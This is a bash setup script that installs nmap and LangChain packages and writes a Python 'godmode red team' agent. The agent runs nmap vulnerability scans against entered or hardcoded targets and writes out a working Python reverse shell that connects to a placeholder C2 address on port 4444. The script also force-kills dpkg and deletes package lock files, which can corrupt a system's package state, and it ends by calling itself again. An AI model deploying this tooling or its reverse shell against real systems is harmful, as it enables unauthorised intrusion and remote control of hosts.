#!/bin/bash
# CLEAN THE MESS + PHASE 1 (MAX 3 TOOLS ONLY) - 32GB RAM READY

echo "🧹 Cleaning the 70+ duplicate microsoft packages mess first..."

# Kill any stuck processes
pkill -9 apt || true
pkill -9 dpkg || true

# Remove all duplicates
sudo rm -f /var/lib/dpkg/lock*
sudo rm -f packages-microsoft-prod.deb*
rm -f packages-microsoft-prod* 2>/dev/null

# Clean sources
sudo sed -i '/microsoft/d' /etc/apt/sources.list
sudo sed -i '/kali/d' /etc/apt/sources.list

sudo apt update --fix-missing

echo "✅ Clean complete. Now starting Phase 1 with only 3 tools."

# PHASE 1: Only 3 powerful tools
sudo apt install -y nmap git python3-pip

pip3 install --quiet langchain-ollama chromadb

# Core godmode agent on clean foundation
cat << 'PHASE1CORE' > nova_god_redteam.py
#!/usr/bin/env python3
import subprocess, multiprocessing, time, os
try:
    from langchain_ollama import OllamaLLM
    llm = OllamaLLM(model="gemma2:9b")
except:
    class DummyLLM:
        def invoke(self, p): return "Godmode chain activated"
    llm = DummyLLM()

def recon(target):
    print(f"🌌 GODMODE recon on {target}")
    subprocess.run(["nmap", "-sV", "-A", "--script=vuln", target])
    return "Intel ready"

def polymorphic_seed(target):
    print("💥 Polymorphic payload foundation built")
    with open("god_seed.py", "w") as f:
        f.write("""import socket,os,pty
s=socket.socket()
s.connect(("YOUR_C2_IP_HERE",4444))
for fd in (0,1,2): os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")""")

def overmind(target):
    recon(target)
    polymorphic_seed(target)
    print(f"✅ Phase 1 complete on {target} - foundation strong")

if __name__ == "__main__":
    print("🚀 NOVA GOD RED TEAMER - Phase 1 Active (32GB RAM)")
    while True:
        target = input("Target or 'auto_phase1': ")
        if target == "auto_phase1":
            targets = ["192.168.1.1", "test.target.com"]
            for t in targets:
                overmind(t)
        else:
            overmind(target)
        time.sleep(45)
PHASE1CORE

chmod +x clean_and_phase1.sh nova_god_redteam.py
bash clean_and_phase1.sh
